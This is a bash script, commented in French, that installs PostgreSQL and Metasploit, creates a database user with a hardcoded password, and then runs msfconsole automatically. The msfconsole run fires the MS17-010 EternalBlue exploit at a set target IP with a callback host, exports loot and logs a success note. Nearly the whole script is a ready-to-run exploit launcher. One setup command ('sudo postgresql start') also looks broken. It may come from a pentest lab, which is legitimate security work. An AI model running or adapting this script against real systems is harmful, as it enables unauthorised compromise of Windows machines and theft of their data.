#!/bin/bash

# Variables de configuration
TARGET_IP="192.168.1.10"
LOCAL_IP="172.24.231.65"
LOCAL_PORT="5432"
DB_USER="msf"
DB_NAME="msf_database"

echo "[+] Mise à jour des paquets et installation de PostgreSQL et Metasploit"
sudo apt update && sudo apt install -y postgresql postgresql-contrib metasploit-framework

echo "[+] Démarrage et configuration de PostgreSQL"
sudo postgresql start
sudo -u postgres psql -c "CREATE USER $DB_USER WITH PASSWORD 'msfpassword';"
sudo -u postgres psql -c "CREATE DATABASE $DB_NAME OWNER $DB_USER;"

echo "[+] Initialisation de la base de données Metasploit"
msfdb init

echo "[+] Lancement de Metasploit et exécution des tâches"
msfconsole -q -x "
db_status;
use exploit/windows/smb/ms17_010_eternalblue;
set RHOST $TARGET_IP;
set LHOST $LOCAL_IP;
run;
loot -t csv;
notes -a 'Exploitation MS17-010 réalisée avec succès.';
exit"
